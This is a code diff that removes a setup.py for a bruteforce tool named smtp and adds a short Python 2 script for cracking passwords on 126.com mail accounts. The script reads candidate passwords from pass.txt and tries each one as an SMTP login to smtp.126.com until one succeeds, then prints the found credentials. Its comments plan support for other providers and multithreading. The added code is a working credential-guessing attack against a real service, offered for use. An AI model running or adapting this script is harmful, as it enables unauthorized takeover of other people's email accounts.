@@ -1,48 +1,64 @@
-import os
-from setuptools import setup, find_packages
+# /usr/bin/env python
+# coding:utf-8
+# Author: x140m1ng <lininruc[at]gmail[dot]com>
+# Version: 0.1
+# Date: 2010-10-12
+#
+# 126邮箱暴力破解
+# 作者: x140m1ng 
+# 邮箱: <lininruc[at]gmail[dot]com>
+# 博客: http://hi.baidu.com/ruclin
+# 原理:
+# 		利用smtp登录,从文本字典(pass.txt)读取，然后不断地枚举密码.
+#       直到接收到字符串"Authentication successful"表示成功.
+#		用poplib枚举也一样,基本相似的原理.
+# TODO:
+#  		1、可以扩展成别的邮箱的,基本上原理一样
+#		2、成功后自动发邮件通知
+#		3、改成多线程
+#		4、增强稳定性
 
-# Important constants
-NAME = "smtp"
-VERSION = "3.0.1"
-REPO = "https://github.com/jalang11/jalang/"
-DESC = """smtp is a security-oriented research framework for
-conducting bruteforce attacks against a multitude of protocols and services"""
+import smtplib ,sys ,time
 
-# Main setup method
-setup(
-    name = NAME,
-    version = VERSION,
-    author = "jalanG",
-    author_email = 'jalang@hush.ai',
-    description = DESC,
-    license = "GPLv3",
-    url=REPO,
-    download_url='{}/archive/v{}'.format(REPO, VERSION),
-    keywords=[
-        'passwords',
-        'cryptography',
-        'systems',
-        'secret-sharing',
-        'privacy',
-    ],
-    packages = find_packages(exclude=('tests',)),
-    entry_points = {
-        'console_scripts': [
-            'smtp=smtp.__main__:main'
-        ],
-    },
-    install_requires=[
-        'paramiko',
-        'selenium',
-        'xmpppy',
-        'requests'
-    ],
-    classifiers=[
-        'Development Status :: 1 - Planning',
-        'Intended Audience :: End Users/Desktop',
-        'Environment :: Console',
-        'Natural Language :: English',
-        'Programming Language :: Python',
-        'Programming Language :: Python :: 2',
-    ]
-)
+def print_usage():
+	print "126crack.py version:0.1"
+	print "Author:x140m1ng"
+	print "Example: python 126crack.py XX@126.com "
+	return
+
+def print_banner():
+	return
+
+def main():
+	server = "smtp.126.com"
+	print_banner()
+	if len(sys.argv) != 2:
+		print_usage()
+		sys.exit(1)
+	else:
+		# parse para
+		user = sys.argv[1]
+		file = open("pass.txt","r")
+		passwds = file.readlines()
+		
+		#Connect smtp and Brute-force
+		
+		for passwd in passwds:
+			passwd = passwd.replace("\n","")
+			try:
+				smtp = smtplib.SMTP()
+				#smtp.set_debuglevel(1)
+				smtp.connect(server)
+				print "trying ",passwd
+				response = smtp.login(user,passwd)
+				smtp.quit()
+				if "Authentication successful" in response:
+					print "[+] user:%s \n[+] passwd:%s" % (user,passwd)
+					return
+			except:
+				time.sleep(1)
+				pass
+		print "[+] sorry ,not found!"
+		
+if __name__=="__main__":
+	main()
